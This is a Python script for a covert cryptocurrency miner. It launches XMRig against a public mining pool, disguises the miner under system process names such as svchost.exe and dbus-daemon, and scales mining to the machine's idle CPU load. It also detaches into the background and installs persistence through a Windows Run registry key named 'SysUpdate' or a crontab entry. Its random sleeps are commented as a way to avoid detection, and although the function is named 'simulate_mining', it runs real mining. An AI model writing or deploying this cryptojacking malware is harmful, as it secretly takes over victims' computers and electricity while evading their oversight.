import platform
import psutil
import subprocess
import time
import os
import shutil
import sys
import random

# Global variables to track mining processes and current intensity
mining_processes = []
current_intensity = None

# Function to determine the path to XMRig based on the operating system
def get_miner_path():
    if platform.system() == "Windows":
        return os.path.join(os.getenv("PROGRAMFILES"), "XMRig", "xmrig.exe")
    else:
        return "/usr/local/bin/xmrig"

# Updated simulate_mining function to perform actual mining with XMRig
def simulate_mining(intensity="normal"):
    global mining_processes
    miner_path = get_miner_path()
    
    # Check if XMRig exists
    if not os.path.exists(miner_path):
        print("Error: XMRig not found. Please install it.")
        return
    
    # Set number of threads based on intensity
    threads = 4 if intensity == "normal" else 8
    
    # Mining command with real pool and wallet (replace 'your_wallet_address')
    mining_cmd = (
        f"{miner_path} "
        "--donate-level 1 "  # Minimum donation to XMRig developers
        "-o stratum+tcp://pool.minexmr.com:4444 "  # Mining pool URL
        "-u your_wallet_address "  # Replace with your actual wallet address
        "-p x "  # Worker name or password
        f"--threads={threads}"  # Number of CPU threads
    )
    
    # Stealth: Spoof process name to avoid detection
    if platform.system() == "Windows":
        fake_name = random.choice(["svchost.exe", "explorer.exe", "winlogon.exe"])
        try:
            shutil.copy(miner_path, fake_name)
            mining_cmd = fake_name + " " + mining_cmd.split(" ", 1)[1]
        except Exception as e:
            print(f"Error copying miner: {e}")
            return
    else:  # Linux/Ubuntu
        fake_name = random.choice(["systemd-resolve", "dbus-daemon", "update-notifier"])
        mining_cmd = f"exec -a {fake_name} {miner_path} " + mining_cmd.split(miner_path, 1)[1]
    
    # Start the mining process in the background
    try:
        process = subprocess.Popen(
            mining_cmd,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        mining_processes.append(process)
        print(f"Mining started with {threads} threads.")
    except Exception as e:
        print(f"Error starting mining: {e}")

# Function to stop all mining processes
def stop_mining():
    global mining_processes
    for process in mining_processes:
        try:
            process.terminate()
        except Exception as e:
            print(f"Error terminating process: {e}")
    mining_processes.clear()

# Function to monitor CPU usage
def monitor_cpu_usage():
    return psutil.cpu_percent(interval=0.5)

# Function to adjust mining intensity based on CPU usage
def adjust_mining_intensity():
    global current_intensity
    cpu_usage = monitor_cpu_usage()
    
    # Determine desired intensity based on CPU load
    if cpu_usage < 15:
        desired_intensity = "high"
    elif cpu_usage < 40:
        desired_intensity = "normal"
    else:
        desired_intensity = None
    
    # Only adjust if intensity changes
    if desired_intensity != current_intensity:
        stop_mining()
        if desired_intensity is not None:
            simulate_mining(desired_intensity)
        current_intensity = desired_intensity

# Function to ensure the script persists across reboots
def implement_persistence():
    script_path = os.path.abspath(__file__)
    if platform.system() == "Windows":
        # Add to Windows startup via registry
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "SysUpdate"
        command = f"{sys.executable} {script_path}"
        subprocess.run(
            f'reg add HKCU\\{key} /v {value_name} /t REG_SZ /d "{command}" /f',
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    else:
        # Add to cron job on Linux/Ubuntu
        cron_cmd = f"echo '*/5 * * * * {sys.executable} {script_path}' | crontab -"
        subprocess.run(cron_cmd, shell=True)

# Main execution block
if __name__ == "__main__":
    # Run script in background if no arguments are provided
    if len(sys.argv) == 1:
        if platform.system() == "Windows":
            subprocess.Popen(
                [sys.executable, __file__, "bg"],
                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
            )
        else:
            subprocess.Popen(
                [sys.executable, __file__, "bg"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        sys.exit(0)
    else:
        # Set up persistence and start the main loop
        implement_persistence()
        while True:
            adjust_mining_intensity()
            time.sleep(random.randint(30, 90))  # Random sleep to avoid detection
